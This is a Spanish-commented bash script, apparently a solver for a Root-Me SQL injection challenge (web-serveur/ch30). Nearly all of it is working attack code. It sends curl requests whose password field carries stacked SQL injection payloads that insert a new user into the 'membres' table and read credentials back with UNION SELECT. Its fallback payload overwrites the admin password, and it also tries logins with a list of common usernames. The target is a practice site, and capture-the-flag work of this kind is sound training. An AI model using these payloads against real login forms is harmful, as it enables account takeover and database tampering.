#!/bin/bash

# ================================================
# INSERTAR USUARIO (VARCHAR(5) - CH30)
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  INSERTAR USUARIO (VARCHAR(5))${NC}"
echo -e "${BLUE}========================================${NC}"

# Usuario de 5 caracteres
NEW_USER="hackr"
NEW_PASS="hack123"
NEW_EMAIL="hack@test.com"

echo -e "\n${YELLOW}[+] Intentando insertar usuario: $NEW_USER (5 caracteres)${NC}"

# Insertar usuario
curl -s -X POST "$URL" \
  -d "username=admin&password='; INSERT INTO membres (username, pass, email) VALUES ('$NEW_USER', '$NEW_PASS', '$NEW_EMAIL')#"

echo -e "\n${YELLOW}[+] Verificando si el usuario fue creado...${NC}"

# Verificar usuario
result=$(curl -s -X POST "$URL" \
  -d "username=admin&password=' UNION SELECT 1,username,pass,4 FROM membres WHERE username='$NEW_USER'#" \
  | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe" | grep -v "Membres" | grep -v "CREATE" | grep -v "strong" | grep -v "form" | grep -v "input" | grep -v "submit" | grep -v "html" | grep -v "header" | grep -v "body" | grep -v "title" | grep -v "link" | grep -v "script" | grep -v "style" | tr -d ' ' | head -1)

echo -e "${YELLOW}[+] Resultado: '$result'${NC}"

if [ -n "$result" ] && [ "$result" != "--" ] && [ "$result" != "//" ] && [ "$result" != "" ] && [ "$result" != "<br/>" ]; then
    echo -e "${GREEN}[✓] USUARIO CREADO EXITOSAMENTE!${NC}"
    echo -e "${GREEN}[✓] Username: $NEW_USER${NC}"
    echo -e "${GREEN}[✓] Password: $NEW_PASS${NC}"
    
    # Intentar autenticar
    echo -e "\n${YELLOW}[+] Intentando autenticar...${NC}"
    login_response=$(curl -s -X POST "$URL" \
      -d "username=$NEW_USER&password=$NEW_PASS" \
      | grep -E "Membres|login failed")
    
    if echo "$login_response" | grep -q "Membres" && ! echo "$login_response" | grep -q "login failed"; then
        echo -e "${GREEN}========================================${NC}"
        echo -e "${GREEN}  ¡DESAFÍO COMPLETADO!${NC}"
        echo -e "${GREEN}  Usuario: $NEW_USER${NC}"
        echo -e "${GREEN}  Contraseña: $NEW_PASS${NC}"
        echo -e "${GREEN}========================================${NC}"
    else
        echo -e "${RED}[✗] Autenticación fallida${NC}"
        
        # Si falla, probar otros usuarios
        echo -e "\n${YELLOW}[+] Probando otros usuarios comunes...${NC}"
        for user in "admin" "user" "root" "test1" "guest"; do
            login_test=$(curl -s -X POST "$URL" \
              -d "username=$user&password=$NEW_PASS" \
              | grep -c "login failed")
            
            if [ "$login_test" -eq 0 ]; then
                echo -e "${GREEN}[✓] Usuario encontrado: $user / $NEW_PASS${NC}"
            fi
        done
    fi
else
    echo -e "${RED}[✗] Usuario NO creado${NC}"
    
    # Intentar con "admin"
    echo -e "\n${YELLOW}[+] Intentando con usuario 'admin'...${NC}"
    curl -s -X POST "$URL" \
      -d "username=admin&password='; UPDATE membres SET pass='admin123' WHERE username='admin'#"
    
    # Verificar
    check_admin=$(curl -s -X POST "$URL" \
      -d "username=admin&password=' UNION SELECT 1,username,pass,4 FROM membres WHERE username='admin'#" \
      | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe" | grep -v "Membres" | grep -v "CREATE" | grep -v "strong" | grep -v "form" | grep -v "input" | grep -v "submit" | grep -v "html" | grep -v "header" | grep -v "body" | grep -v "title" | grep -v "link" | grep -v "script" | grep -v "style" | tr -d ' ' | head -1)
    
    echo -e "${YELLOW}[+] Resultado: '$check_admin'${NC}"
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN DE PRUEBAS${NC}"
echo -e "${BLUE}========================================${NC}"
